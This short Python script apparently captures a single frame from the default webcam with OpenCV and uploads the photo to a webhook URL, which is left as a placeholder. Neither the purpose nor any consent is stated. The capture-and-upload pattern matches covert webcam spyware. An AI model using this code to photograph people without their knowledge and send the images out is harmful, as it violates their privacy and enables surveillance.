import cv2 
import requests 

WEBHOOK_URL = "url" 


cam = cv2.VideoCapture(0)
ret, frame = cam.read() 
cam.release()

if not ret: 
    print("picture capture has failed")
    exit(1)

cv2.imwrite("shot.jpg", frame)

with open("shot.jpg", "rb") as f: 
    files = {"file": ("shot.jpg", f, "image/jpeg")} 
    r = requests.post(WEBHOOK_URL, files=files, timeout=15) 

print("sent successfully", r.status_code)
    